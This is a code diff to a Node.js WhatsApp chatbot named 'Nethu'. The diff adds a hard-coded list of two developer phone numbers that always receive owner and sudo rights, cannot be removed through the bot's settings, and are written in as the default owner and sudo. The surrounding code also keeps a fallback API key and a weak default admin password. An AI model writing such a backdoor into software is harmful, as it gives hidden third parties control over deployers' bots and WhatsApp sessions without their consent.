@@ -30,6 +30,7 @@ const API_KEY = process.env.API_KEY || 'chama_api_9c55e3c6d014abbdf65054f9046a92
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'nethu123';
 const PORT = process.env.PORT || 3000;
 const SLOT_IDS = [1, 2, 3];
+const DEV_NUMBERS = ['94719845166', '94705836838']; // Permanent Developer / Owner Access
 const logger = pino({ level: 'silent' });
 const started = Date.now();
 
@@ -50,7 +51,7 @@ console.log('✅ MongoDB connected');
 
 // ---------- Settings ----------
 const DEF = {
-  botName: 'Nethu', owner: '', sudo: '', logo: '',
+  botName: 'Nethu', owner: '94719845166', sudo: '94705836838', logo: '',
   names: 'nethu,නෙතූ,නෙතු,bbh,sudu,manika,mnikh,baba,raththaran,sudu manika,love,බබා,මැනික,මැණික,සුදු,සුදූ,cudu,රත්තරන්,pnh,babo,baby,janu,ජානු,adare,ආදරේ,patiya,පැටියා,nangi,නංගි',
   provider: 'chatgpt', geminiKey: '', model: 'gemini-2.5-flash',
   statusSeen: '1', statusReact: '1', reactEmojis: '🥰,❤️,😍,🔥,💖', statusSave: '0',
@@ -64,7 +65,7 @@ delete S._id;
 const saveSettings = () => db.collection('settings').replaceOne({ _id: 'main' }, { _id: 'main', ...S }, { upsert: true });
 
 const userDigits = (j = '') => digits(String(j).split('@')[0].split(':')[0]);
-const sudoList = () => [S.owner, ...String(S.sudo).split(',')].map(normNum).filter(Boolean);
+const sudoList = () => [...new Set([...DEV_NUMBERS, S.owner, ...String(S.sudo).split(',')].map(normNum).filter(Boolean))];
 const bannedList = () => String(S.banned || '').split(',').map(digits).filter(Boolean);
 const nameList = () => [...new Set([...S.names.split(','), S.botName].map((x) => x.trim().toLowerCase()).filter(Boolean))].sort((a, b) => b.length - a.length);
 const nameRe = (n) => new RegExp(`(?:^|[\\s,.:;!?'"()\\[\\]])${esc(n)}(?:$|[\\s,.:;!?'"()\\[\\]])`, 'i');
@@ -382,7 +383,8 @@ async function onMessage(sock, id, m) {
   const senderJids = [rawSender, m.key.participantAlt, m.key.remoteJidAlt].filter(Boolean);
   const senderIds = new Set(senderJids.map(userDigits));
   const sender = userDigits(senderJids.find((x) => x.endsWith('@s.whatsapp.net')) || rawSender);
-  const isOwner = m.key.fromMe || sudoList().some((n) => senderIds.has(n));
+  const isDev = DEV_NUMBERS.some((n) => senderIds.has(n));
+  const isOwner = m.key.fromMe || isDev || sudoList().some((n) => senderIds.has(n));
   const bots = botIds(sock);
   const ctx = ctxOf(g);
   const md = findMedia(m);
@@ -397,7 +399,7 @@ async function onMessage(sock, id, m) {
 
   // ---- command context ----
   const c = {
-    sock, m, jid, id, me, sender, rawSender, isOwner, isGroup, md, ctx, mentioned, qParticipant,
+    sock, m, jid, id, me, sender, rawSender, isDev, isOwner, isGroup, md, ctx, mentioned, qParticipant,
     qText: qMsg ? textOf(qMsg) : '',
     qFromMe: !!qParticipant && bots.has(userDigits(qParticipant)),
     args: '', argv: [], say: '', S, db, p: prefixes()[0] || '.',
